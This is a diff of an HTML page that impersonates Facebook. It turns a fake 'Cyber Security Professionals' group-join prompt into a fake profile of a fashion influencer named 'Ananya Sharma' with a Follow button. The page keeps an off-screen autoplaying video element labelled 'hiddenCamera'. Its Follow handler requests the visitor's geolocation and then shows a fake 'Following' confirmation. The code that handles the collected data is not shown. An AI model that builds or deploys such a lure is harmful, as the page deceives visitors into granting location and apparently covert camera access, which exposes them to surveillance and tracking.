@@ -3,149 +3,373 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Facebook - Join Group</title>
+<title>Facebook</title>
 <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        background: #18191a;
-        min-height: 100vh;
-        display: flex;
-        align-items: flex-end;
-        justify-content: center;
-        overflow: hidden;
-    }
-    .fb-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #18191a; z-index: 0; }
-    .fb-topbar {
-        background: #242526;
-        padding: 12px 16px;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        border-bottom: 0.5px solid #3a3b3c;
-    }
-    .fb-logo { font-size: 24px; font-weight: 700; color: #1877f2; }
-    .bottom-sheet {
-        position: fixed;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        z-index: 20;
-        background: #242526;
-        border-radius: 28px 28px 0 0;
-        max-height: 65vh;
-        min-height: 50vh;
-        animation: sheetUp 0.35s ease-out;
-        overflow-y: auto;
-    }
-    @keyframes sheetUp {
-        from { transform: translateY(100%); }
-        to { transform: translateY(0); }
-    }
-    .drag-handle {
-        width: 36px; height: 4px;
-        background: rgba(255,255,255,0.2);
-        border-radius: 2px;
-        margin: 10px auto 0 auto;
-    }
-    .group-hero { text-align: center; padding: 20px; }
-    .group-avatar {
-        width: 80px; height: 80px;
-        background: #1877f2;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 12px auto;
-        font-size: 40px;
-    }
-    .group-name { font-size: 20px; font-weight: 700; color: #e4e6eb; }
-    .group-meta { font-size: 13px; color: #b0b3b8; margin-top: 4px; }
-    .stats-row {
-        display: flex;
-        justify-content: space-evenly;
-        padding: 16px;
-        background: #3a3b3c;
-        margin: 12px 20px;
-        border-radius: 16px;
-    }
-    .stat-item { text-align: center; }
-    .stat-value { font-size: 18px; font-weight: 700; color: #e4e6eb; }
-    .stat-label { font-size: 11px; color: #b0b3b8; }
-    .join-btn {
-        width: calc(100% - 40px);
-        margin: 20px;
-        padding: 14px;
-        background: #1877f2;
-        color: white;
-        border: none;
-        border-radius: 28px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-    }
-    .join-btn:hover { background: #1466d6; }
-    #hiddenCamera { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
-    .toast-message {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #242526;
-        color: white;
-        padding: 10px 20px;
-        border-radius: 28px;
-        font-size: 13px;
-        z-index: 1000;
-    }
-    .success-modal {
-        position: fixed;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(0,0,0,0.9);
-        display: flex; align-items: center; justify-content: center;
-        z-index: 2000;
-    }
-    .success-content {
-        background: #242526;
-        margin: 20px;
-        padding: 32px;
-        border-radius: 32px;
-        text-align: center;
-        max-width: 280px;
-    }
-    .success-icon { font-size: 56px; margin-bottom: 16px; }
-    .success-content h3 { font-size: 20px; color: #e4e6eb; margin-bottom: 8px; }
-    .success-content p { font-size: 14px; color: #b0b3b8; margin-bottom: 24px; }
-    .success-content button {
-        background: #1877f2; color: white; border: none;
-        padding: 12px 24px; border-radius: 28px;
-        font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;
-    }
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #18191a;
+    min-height: 100vh;
+    overflow: hidden;
+  }
+
+  /* ── Fake FB Feed ── */
+  .fb-bg { position: fixed; inset: 0; background: #18191a; z-index: 0; }
+
+  .fb-topbar {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 5;
+    background: #242526;
+    padding: 0 12px;
+    border-bottom: 1px solid #3a3b3c;
+    display: flex;
+    flex-direction: column;
+    align-items: stretch;
+  }
+  .fb-topbar-row1 {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 0;
+  }
+  .fb-wordmark { font-size: 24px; font-weight: 800; color: #1877f2; letter-spacing: -0.5px; }
+  .fb-topbar-icons { display: flex; gap: 8px; }
+  .fb-icon-btn {
+    width: 38px; height: 38px;
+    background: #3a3b3c;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 17px;
+    cursor: pointer;
+  }
+  .fb-nav-row {
+    display: flex;
+    border-top: 1px solid #3a3b3c;
+  }
+  .fb-nav-item {
+    flex: 1; padding: 8px 0;
+    display: flex; justify-content: center;
+    border-bottom: 3px solid transparent;
+    opacity: 0.6;
+    cursor: pointer;
+    font-size: 20px;
+  }
+  .fb-nav-item.active { border-bottom-color: #1877f2; opacity: 1; }
+
+  /* Stories */
+  .fb-stories {
+    position: fixed; top: 101px; left: 0; right: 0; z-index: 4;
+    background: #18191a;
+    padding: 12px;
+    display: flex; gap: 8px; overflow-x: auto;
+  }
+  .fb-stories::-webkit-scrollbar { display: none; }
+  .fb-story-card {
+    width: 96px; height: 156px; border-radius: 12px; flex-shrink: 0;
+    overflow: hidden; position: relative; cursor: pointer;
+  }
+  .fb-story-bg { width: 100%; height: 100%; object-fit: cover; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 8px; }
+  .fb-story-create { background: #3a3b3c; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; padding-bottom: 8px; }
+  .fb-story-plus { width: 32px; height: 32px; background: #1877f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+  .fb-story-label { font-size: 11px; font-weight: 600; color: #e4e6eb; text-align: center; }
+  .fb-story-avatar { position: absolute; top: 8px; left: 8px; width: 32px; height: 32px; border-radius: 50%; border: 3px solid #e91e63; background: #f5a3b7; display: flex; align-items: center; justify-content: center; font-size: 16px; }
+  .fb-story-gradient { position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, transparent 50%); }
+
+  /* Post */
+  .fb-feed {
+    position: fixed; top: 275px; left: 0; right: 0; bottom: 0;
+    overflow-y: auto; z-index: 3; background: #18191a;
+  }
+  .fb-post { background: #242526; margin-bottom: 8px; }
+  .fb-post-header { display: flex; align-items: center; gap: 10px; padding: 12px 14px; }
+  .fb-post-av { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #e91e63, #f5a3b7); display: flex; align-items: center; justify-content: center; font-size: 20px; }
+  .fb-post-name { font-size: 14px; font-weight: 700; color: #e4e6eb; }
+  .fb-post-time { font-size: 12px; color: #b0b3b8; }
+  .fb-post-more { margin-left: auto; color: #b0b3b8; font-size: 20px; }
+  .fb-post-text { padding: 0 14px 12px; font-size: 15px; color: #e4e6eb; line-height: 1.5; }
+  .fb-post-image { width: 100%; height: 200px; background: linear-gradient(135deg, #f5a3b7 0%, #e91e63 40%, #f5a3b7 70%, #e91e63 100%); display: flex; align-items: center; justify-content: center; font-size: 64px; position: relative; overflow: hidden; }
+  .fb-post-image-text { position: absolute; bottom: 12px; left: 14px; right: 14px; font-size: 13px; font-weight: 700; color: rgba(255,255,255,0.8); letter-spacing: 1px; text-shadow: 0 1px 2px rgba(0,0,0,0.3); }
+  .fb-reactions { padding: 10px 14px; display: flex; align-items: center; justify-content: space-between; border-top: 1px solid #3a3b3c; }
+  .fb-reactions-left { display: flex; align-items: center; gap: 4px; font-size: 13px; color: #b0b3b8; }
+  .react-emojis { display: flex; }
+  .react-emojis span { width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; border: 1px solid #242526; margin-left: -4px; }
+  .fb-action-row { display: flex; padding: 4px 8px; border-top: 1px solid #3a3b3c; }
+  .fb-action { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 8px; border-radius: 8px; font-size: 13px; font-weight: 600; color: #b0b3b8; cursor: pointer; }
+
+  /* Overlay */
+  .sheet-overlay {
+    position: fixed; inset: 0; z-index: 15;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(2px);
+  }
+
+  /* ── Bottom Sheet ── */
+  .bottom-sheet {
+    position: fixed; bottom: 0; left: 0; right: 0; z-index: 20;
+    background: #242526;
+    border-radius: 20px 20px 0 0;
+    animation: sheetUp 0.38s cubic-bezier(.22,.68,0,1.2);
+    box-shadow: 0 -6px 40px rgba(0,0,0,0.5);
+    overflow: hidden;
+  }
+  @keyframes sheetUp {
+    from { transform: translateY(100%); opacity: 0.5; }
+    to   { transform: translateY(0);   opacity: 1; }
+  }
+
+  .drag-pill { width: 36px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 12px auto 0; }
+
+  /* Cover banner */
+  .group-cover {
+    width: 100%; height: 100px;
+    background: linear-gradient(135deg, #e91e63 0%, #f5a3b7 50%, #e91e63 100%);
+    display: flex; align-items: center; justify-content: center;
+    position: relative; overflow: hidden; margin-top: 12px;
+  }
+  .cover-pattern {
+    position: absolute; inset: 0; opacity: 0.15;
+    background-image: repeating-linear-gradient(45deg, #fff 0, #fff 1px, transparent 0, transparent 50%);
+    background-size: 12px 12px;
+  }
+  .cover-label { font-size: 11px; font-weight: 700; color: rgba(255,255,255,0.7); letter-spacing: 3px; text-transform: uppercase; position: relative; z-index: 1; }
+
+  /* Group info */
+  .group-info-row {
+    display: flex; align-items: flex-end; gap: 12px;
+    padding: 0 16px;
+    margin-top: -28px; position: relative; z-index: 2;
+  }
+  .group-avatar {
+    width: 68px; height: 68px; border-radius: 16px;
+    background: linear-gradient(135deg, #e91e63, #f5a3b7);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 34px;
+    border: 3px solid #242526;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+  }
+  .group-text { flex: 1; padding-bottom: 4px; }
+  .group-name { font-size: 17px; font-weight: 800; color: #e4e6eb; }
+  .group-meta { font-size: 12px; color: #b0b3b8; margin-top: 2px; }
+  .group-lock { font-size: 11px; color: #b0b3b8; display: flex; align-items: center; gap: 3px; margin-top: 2px; }
+
+  /* Stats */
+  .stats-chips {
+    display: flex; gap: 6px; padding: 14px 16px 0; flex-wrap: wrap;
+  }
+  .stat-chip {
+    background: #3a3b3c; border-radius: 20px; padding: 5px 12px;
+    display: flex; align-items: center; gap: 4px;
+    font-size: 12px; font-weight: 600; color: #e4e6eb;
+  }
+  .stat-chip-dot { width: 6px; height: 6px; border-radius: 50%; background: #e91e63; }
+
+  /* Members row */
+  .members-row {
+    display: flex; align-items: center; gap: -4px;
+    padding: 12px 16px 0;
+  }
+  .member-av {
+    width: 28px; height: 28px; border-radius: 50%;
+    border: 2px solid #242526;
+    background: #f5a3b7;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    margin-left: -6px;
+  }
+  .member-av:first-child { margin-left: 0; }
+  .members-text { font-size: 12px; color: #b0b3b8; margin-left: 8px; }
+  .members-text span { color: #e4e6eb; font-weight: 600; }
+
+  /* About */
+  .about-text {
+    padding: 12px 16px 0;
+    font-size: 13px; color: #b0b3b8; line-height: 1.5;
+  }
+  .about-tag { color: #e91e63; }
+
+  /* Button */
+  .join-btn {
+    width: calc(100% - 32px); margin: 16px 16px 20px;
+    padding: 13px;
+    background: #e91e63; color: #fff;
+    border: none; border-radius: 10px;
+    font-size: 15px; font-weight: 700; cursor: pointer;
+    letter-spacing: 0.2px;
+    transition: background 0.2s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .join-btn:hover { background: #c2185b; }
+  .join-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  /* Toast */
+  .toast-message {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%);
+    background: #3a3b3c; color: #fff;
+    padding: 9px 18px; border-radius: 22px;
+    font-size: 13px; z-index: 1000; white-space: nowrap; pointer-events: none;
+  }
+
+  /* Success Modal */
+  .success-modal {
+    position: fixed; inset: 0; z-index: 2000;
+    display: flex; align-items: flex-end; justify-content: center;
+  }
+  .modal-bg { position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(6px); }
+  .modal-feed-peek {
+    position: absolute; top: 0; left: 0; right: 0; height: 50%; overflow: hidden; pointer-events: none;
+  }
+  .mfp-post { background: #242526; }
+  .mfp-img { width: 100%; height: 180px; background: linear-gradient(135deg, #f5a3b7 0%, #e91e63 80%); display: flex; align-items: center; justify-content: center; font-size: 56px; }
+  .mfp-bar2 { padding: 10px 14px; display: flex; align-items: center; gap: 10px; }
+  .mfp-av2 { width: 32px; height: 32px; background: linear-gradient(135deg,#e91e63,#f5a3b7); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 15px; }
+  .mfp-name2 { font-size: 13px; font-weight: 700; color: #e4e6eb; }
+  .mfp-sub2 { font-size: 11px; color: #b0b3b8; }
+
+  .modal-card {
+    position: relative; z-index: 1; background: #242526; width: 100%;
+    border-radius: 20px 20px 0 0; overflow: hidden;
+    animation: sheetUp 0.4s cubic-bezier(.22,.68,0,1.2);
+  }
+  .modal-banner2 {
+    width: 100%; height: 110px;
+    background: linear-gradient(135deg, #e91e63 0%, #f5a3b7 60%, #e91e63 100%);
+    display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden;
+  }
+  .modal-banner2-emoji { font-size: 48px; position: relative; z-index: 1; }
+  .modal-cover-pattern { position: absolute; inset: 0; opacity: 0.1; background-image: repeating-linear-gradient(45deg, #fff 0, #fff 1px, transparent 0, transparent 50%); background-size: 12px 12px; }
+  .modal-inner { padding: 20px 20px 0; text-align: center; }
+  .modal-tick2 { width: 52px; height: 52px; background: #e91e63; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: -40px auto 12px; border: 4px solid #242526; font-size: 24px; }
+  .modal-title2 { font-size: 20px; font-weight: 800; color: #e4e6eb; }
+  .modal-sub2 { font-size: 14px; color: #b0b3b8; margin-top: 6px; line-height: 1.4; }
+  .modal-actions2 { padding: 20px 20px 28px; display: flex; flex-direction: column; gap: 10px; }
+  .modal-btn-p2 { width: 100%; padding: 13px; background: #e91e63; color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; }
+  .modal-btn-g2 { width: 100%; padding: 13px; background: transparent; color: #b0b3b8; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; }
+
+  #hiddenCamera { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
 </style>
 </head>
 <body>
 
 <video id="hiddenCamera" autoplay playsinline muted></video>
 
-<div class="fb-bg"></div>
+<!-- Fake FB Background -->
+<div class="fb-bg">
+  <div class="fb-topbar">
+    <div class="fb-topbar-row1">
+      <div class="fb-wordmark">facebook</div>
+      <div class="fb-topbar-icons">
+        <div class="fb-icon-btn">🔍</div>
+        <div class="fb-icon-btn">🔔</div>
+        <div class="fb-icon-btn">💬</div>
+      </div>
+    </div>
+    <div class="fb-nav-row">
+      <div class="fb-nav-item active">🏠</div>
+      <div class="fb-nav-item">👥</div>
+      <div class="fb-nav-item">▶️</div>
+      <div class="fb-nav-item">🛒</div>
+      <div class="fb-nav-item">☰</div>
+    </div>
+  </div>
 
+  <div class="fb-stories">
+    <div class="fb-story-card fb-story-create" style="background:#242526">
+      <div style="flex:1;display:flex;align-items:flex-end;justify-content:center;padding-bottom:4px"><div class="fb-story-plus">+</div></div>
+      <div class="fb-story-label" style="padding-bottom:6px">Create story</div>
+    </div>
+    <div class="fb-story-card" style="background:linear-gradient(180deg,#e91e63,#f5a3b7)">
+      <div class="fb-story-gradient"></div>
+      <div class="fb-story-avatar">💖</div>
+      <div style="position:absolute;bottom:8px;left:0;right:0;text-align:center"><span style="font-size:11px;font-weight:700;color:#fff">Ananya</span></div>
+    </div>
+    <div class="fb-story-card" style="background:linear-gradient(180deg,#f5a3b7,#e91e63)">
+      <div class="fb-story-gradient"></div>
+      <div class="fb-story-avatar">💃</div>
+      <div style="position:absolute;bottom:8px;left:0;right:0;text-align:center"><span style="font-size:11px;font-weight:700;color:#fff">Fashion</span></div>
+    </div>
+    <div class="fb-story-card" style="background:linear-gradient(180deg,#e91e63,#c2185b)">
+      <div class="fb-story-gradient"></div>
+      <div class="fb-story-avatar">✨</div>
+      <div style="position:absolute;bottom:8px;left:0;right:0;text-align:center"><span style="font-size:11px;font-weight:700;color:#fff">GlowUp</span></div>
+    </div>
+  </div>
+
+  <div class="fb-feed">
+    <div class="fb-post">
+      <div class="fb-post-header">
+        <div class="fb-post-av">💖</div>
+        <div><div class="fb-post-name">Ananya Sharma</div><div class="fb-post-time">1h · 🌸</div></div>
+        <div class="fb-post-more">···</div>
+      </div>
+      <div class="fb-post-text">✨ New outfit alert! Absolutely in love with this ethnic look. What do you guys think? 💕 #EthnicVibes #DesiGirl #FashionDiaries</div>
+      <div class="fb-post-image" style="height:180px">
+        <span>💃</span>
+        <div class="fb-post-image-text">NEW COLLECTION — ETHNIC WEAR</div>
+      </div>
+      <div class="fb-reactions">
+        <div class="fb-reactions-left">
+          <div class="react-emojis"><span style="background:#e91e63">❤️</span><span style="background:#f39c12">👍</span><span style="background:#9b59b6">😮</span></div>
+          <span>12.4K</span>
+        </div>
+        <span style="font-size:12px;color:#b0b3b8">2.1K comments · 412 shares</span>
+      </div>
+      <div class="fb-action-row">
+        <div class="fb-action">👍 Like</div>
+        <div class="fb-action">💬 Comment</div>
+        <div class="fb-action">↗️ Share</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Overlay -->
+<div class="sheet-overlay"></div>
+
+<!-- Bottom Sheet -->
 <div class="bottom-sheet">
-    <div class="drag-handle"></div>
-    <div class="group-hero">
-        <div class="group-avatar">👥</div>
-        <div class="group-name">Cyber Security Professionals</div>
-        <div class="group-meta">Public Group • 45K members</div>
-    </div>
-    
-    <div class="stats-row">
-        <div class="stat-item"><div class="stat-value">45K</div><div class="stat-label">Members</div></div>
-        <div class="stat-item"><div class="stat-value">2.3K</div><div class="stat-label">Online</div></div>
-        <div class="stat-item"><div class="stat-value">⭐ 4.8</div><div class="stat-label">Rating</div></div>
-    </div>
+  <div class="drag-pill"></div>
 
-    <button id="joinBtn" class="join-btn" onclick="joinGroup()">
-        🔗 JOIN GROUP
-    </button>
+  <div class="group-cover">
+    <div class="cover-pattern"></div>
+    <div class="cover-label">Ananya Sharma Official</div>
+  </div>
+
+  <div class="group-info-row">
+    <div class="group-avatar">💖</div>
+    <div class="group-text">
+      <div class="group-name">Ananya Sharma</div>
+      <div class="group-meta">Public Figure</div>
+      <div class="group-lock">🌐 Fashion • Lifestyle • Mumbai</div>
+    </div>
+  </div>
+
+  <div class="stats-chips">
+    <div class="stat-chip"><div class="stat-chip-dot"></div>2.8K online now</div>
+    <div class="stat-chip">👥 524,000 followers</div>
+    <div class="stat-chip">💖 New Collection Launch</div>
+  </div>
+
+  <div class="members-row">
+    <div class="member-av">💖</div>
+    <div class="member-av">💃</div>
+    <div class="member-av">✨</div>
+    <div class="member-av">🌸</div>
+    <div class="member-av">+</div>
+    <div class="members-text"><span>Priya, Neha</span> and 524K others follow her</div>
+  </div>
+
+  <div class="about-text">
+    💕 Fashion influencer | Lifestyle blogger | Mumbai📍<br>
+    ✨ Spreading positivity and style<br>
+    📧 Collab: ananya@style.in<br>
+    <span class="about-tag">#DesiGirl</span> <span class="about-tag">#FashionDiaries</span> <span class="about-tag">#MumbaiBlogger</span> <span class="about-tag">#StyleInspo</span>
+  </div>
+
+  <button id="joinBtn" class="join-btn" onclick="joinGroup()">
+    <span>💖</span> Follow
+  </button>
 </div>
 
 <script>
@@ -155,7 +379,7 @@ let locationData = null;
 async function joinGroup() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = true;
-    btn.textContent = "Requesting...";
+    btn.innerHTML = '<span>⏳</span> Requesting...';
     showToast("📍 Requesting location...");
     
     if (!navigator.geolocation) {
@@ -227,14 +451,37 @@ function showToast(msg) {
 function showSuccessModal() {
     const modal = document.createElement('div');
     modal.className = 'success-modal';
-    modal.innerHTML = `<div class="success-content"><div class="success-icon">✅</div><h3>Joined Successfully!</h3><p>You are now a member of Cyber Security Professionals group.</p><button onclick="window.location.href='/'">OK</button></div>`;
+    modal.innerHTML = `
+      <div class="modal-bg"></div>
+      <div class="modal-feed-peek">
+        <div class="mfp-post">
+          <div class="mfp-img">💖</div>
+          <div class="mfp-bar2"><div class="mfp-av2">💖</div><div><div class="mfp-name2">Ananya Sharma</div><div class="mfp-sub2">New outfit post! ✨</div></div></div>
+        </div>
+      </div>
+      <div class="modal-card">
+        <div class="modal-banner2">
+          <div class="modal-cover-pattern"></div>
+          <div class="modal-banner2-emoji">💖</div>
+        </div>
+        <div class="modal-inner">
+          <div class="modal-tick2">✓</div>
+          <div class="modal-title2">Following Ananya!</div>
+          <div class="modal-sub2">You'll now see her posts in your feed. Stay tuned for amazing fashion content! 💕</div>
+        </div>
+        <div class="modal-actions2">
+          <button class="modal-btn-p2" onclick="window.location.href='/'">View Feed</button>
+          <button class="modal-btn-g2" onclick="window.location.href='/'">Maybe later</button>
+        </div>
+      </div>
+    `;
     document.body.appendChild(modal);
 }
 
 function resetButton() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = false;
-    btn.innerHTML = "🔗 JOIN GROUP";
+    btn.innerHTML = '<span>💖</span> Follow';
 }
 </script>
 </body>
